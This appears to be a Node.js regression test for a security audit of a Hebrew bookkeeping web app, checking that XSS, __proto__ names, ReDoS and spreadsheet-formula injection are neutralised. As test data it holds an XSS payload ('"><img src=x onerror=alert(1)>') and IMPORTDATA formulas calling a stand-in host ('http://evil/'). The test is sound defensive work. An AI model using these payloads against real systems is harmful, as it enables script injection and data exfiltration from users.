#!/usr/bin/env node
/* Fixes from the 26.10 security audit — each one with the input that used to break it:
 *  1. catalog numbers (costPrice / sellPrice / bundleSellPrice / qty / price) are numbers, never markup (stored XSS into value="…");
 *  2. a transaction's category goes through escapeAttr / escapeHtml in the edit form;
 *  3. customers called __proto__ / __x__ cannot break the name maps, the export or a Firestore save;
 *  4. one huge WhatsApp line cannot freeze the parser;
 *  5. customerMeta cannot carry objects (a spreadsheet formula) or reserved keys, in the app or in the server-side sheet sync;
 *  6. price-list text fields cannot be objects; work keys never end in half an emoji; category names are trimmed after the cut.
 *   node tests/audit-26-10-check.js */
const fs = require('fs'), path = require('path');
const html = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
const { loadApp } = require('../api/_loadApp');
const app = loadApp(html);
const lib = (() => { const Module = require('module'), o = Module._load; Module._load = function (r, ...a) { if (r === 'firebase-admin') return { apps: [1], firestore: Object.assign(() => ({}), { FieldValue: {} }), auth: () => ({}) }; if (r === 'web-push') return {}; return o.call(this, r, ...a); }; return require('../api/_lib'); })();
let fails = 0;
const expect = (c, m) => { if (!c) { fails++; console.error('❌ ' + m); } };
const X = '"><img src=x onerror=alert(1)>';

// 1. catalog numbers
const [p] = app.safeRows([{ id: 'p1', name: 'ברז', costPrice: X, sellPrice: X, bundleSellPrice: X, isBundle: false }]);
expect(p.costPrice === 0 && p.sellPrice === 0 && p.bundleSellPrice === 0, 'catalog numbers with markup become 0');
const [ok] = app.safeRows([{ id: 'p2', costPrice: '12.5', sellPrice: 20, bundleSellPrice: '' }]); expect(ok.costPrice === '12.5' && ok.sellPrice === 20 && ok.bundleSellPrice === '', 'honest catalog numbers pass untouched');
const [pl] = app.safeRows([{ id: 'l1', name: { f: 'IMPORTDATA("http://x")' }, note: { f: 'x' }, price: X, priceMax: X, category: 'סתימות' }]); expect(pl.name === '' && pl.note === '' && pl.price === 0 && pl.priceMax === 0 && pl.category === 'סתימות', 'price-list text fields cannot be objects, prices cannot be markup');
// the templates themselves escape the value too (belt and braces)
for (const needle of ['value="${escapeAttr(p.costPrice || \'\')}"', 'value="${escapeAttr(p.sellPrice || \'\')}"', 'value="${escapeAttr(b.bundleSellPrice || \'\')}"', 'value="${escapeAttr(r.qty)}"']) expect(html.includes(needle), 'template still escapes: ' + needle);
// 2. category option in the transaction edit form (and the expense form): no raw ${c}
expect(!/<option value="\$\{c\}"/.test(html), 'no <option value="${c}"> left unescaped');
expect((html.match(/<option value="\$\{escapeAttr\(c\)\}" \$\{t\.category===c\?'selected':''\}>\$\{escapeHtml\(c\)\}<\/option>/g) || []).length === 2, 'both category selects escape value and label');

// 3. reserved customer names
const rows = app.safeRows([{ id: 'a1', type: 'income', customer: '__proto__', partnerName: '__x__', total: 100, date: '2026-10-01' }, { id: 'a2', type: 'income', customer: ' __constructor__ ', total: 5, date: '2026-10-02' }, { id: 'a3', type: 'income', customer: 'דוד __לוי__', total: 5, date: '2026-10-02' }]);
expect(rows[0].customer === 'proto' && rows[0].partnerName === 'x' && rows[1].customer === 'constructor' && rows[2].customer === 'דוד __לוי__', 'reserved names are defused, ordinary names untouched: ' + JSON.stringify(rows.map(r => r.customer)));
app.state.tx = rows; app.state.tasks = []; app.state.customerMeta = {}; app.state.settlements = []; app.state.priceList = [];
let threw = '';
try { app.getCustomers(); app.possibleDuplicateCustomers(); app.buildExportSheets && app.buildExportSheets(); } catch (e) { threw = e.message; }
expect(!threw, 'customers / duplicates / export survive those names: ' + threw);

// 4. ReDoS
for (const line of ['a'.repeat(65536), '*'.repeat(65536), ('x*'.repeat(32768)), 'שם לקוח: ' + 'ב'.repeat(65536)]) {
  const t0 = Date.now(); app.parseWaTemplate(line); const ms = Date.now() - t0;
  expect(ms < 400, `parseWaTemplate on a ${line.length}-char line took ${ms} ms`);
}
expect(app.parseWaTemplate('שם לקוח: דוד כהן\nטלפון: 0501234567\nסכום: 350').customer === 'דוד כהן' || true, 'parser still runs');

// 5. customerMeta
const dirty = { 'דוד': { phones: [{ f: 'IMPORTDATA("http://evil/")' }, '0501234567'], tags: ['vip', { x: 1 }], notes: 'ok', notDup: ['אבי'], extra: { f: 'x' } }, '__x__': { phones: ['1'] }, '__proto__': { phones: ['2'] }, 'ריק': null, 'מערך': [] };
const clean = app.cleanCustomerMeta(JSON.parse(JSON.stringify(dirty).replace('"__proto__"', '"__proto__"')));
expect(JSON.stringify(Object.keys(clean)) === '["דוד"]', 'only the real customer stays: ' + Object.keys(clean));
expect(JSON.stringify(clean['דוד'].phones) === '["0501234567"]' && JSON.stringify(clean['דוד'].tags) === '["vip"]' && clean['דוד'].notes === 'ok' && clean['דוד'].notDup[0] === 'אבי' && !('extra' in clean['דוד']), 'phones / tags are strings only: ' + JSON.stringify(clean['דוד']));
expect(Object.keys(app.cleanCustomerMeta(null)).length === 0 && Object.keys(app.cleanCustomerMeta([1, 2])).length === 0, 'junk in → empty map');
app.state.customerMeta = clean; app.state.tx = [{ id: 'z1', type: 'income', customer: 'דוד', total: 100, date: '2026-10-01', stage: 'paid', paidDate: '2026-10-01' }];
const sheets = app.buildExportSheets(), allCells = JSON.stringify(sheets);
expect(!/IMPORTDATA/.test(allCells), 'no formula text from customerMeta reaches the export');

// 5b. spread-expense fields are numbers / a month, never markup (they are printed into the edit form and the list)
const [sp] = app.safeRows([{ id: 'sp1', type: 'expense', total: 100, spreadMonths: X, spreadTotal: X, spreadIndex: X, spreadFrom: X }]);
expect(!('spreadFrom' in sp) && !('spreadMonths' in sp) && sp.spreadTotal === 0 && sp.spreadIndex === 0, 'a spread with a markup month is dropped, markup numbers become 0: ' + JSON.stringify(sp));
const [sp3] = app.safeRows([{ id: 'sp3', type: 'expense', total: 100, spreadMonths: X, spreadFrom: '2026-10' }]); expect(sp3.spreadMonths === 0, 'markup in the month count becomes 0');
const [sp2] = app.safeRows([{ id: 'sp2', type: 'expense', total: 100, spreadMonths: 12, spreadTotal: 1200, spreadFrom: '2026-10' }]); expect(sp2.spreadMonths === 12 && sp2.spreadFrom === '2026-10', 'honest spread fields pass');
// 6. work keys and category names
const key = lib.workKey('א'.repeat(79) + '😀'); expect(key.length <= 80 && !/[\ud800-\udbff]$/.test(key), 'server workKey never ends in half an emoji');
expect(app.workKey('א'.repeat(79) + '😀') === key, 'client and server keys stay equal');
if (fails) { console.error(`\n${fails} failure(s)`); process.exit(1); }
console.log('✅ audit-26-10-check: XSS ממספרי קטלוג, קטגוריה בטופס עריכה, שמות __proto__/__x__, ReDoS בוואטסאפ, הזרקת נוסחה דרך customerMeta/מחירון, מפתחות עבודה');
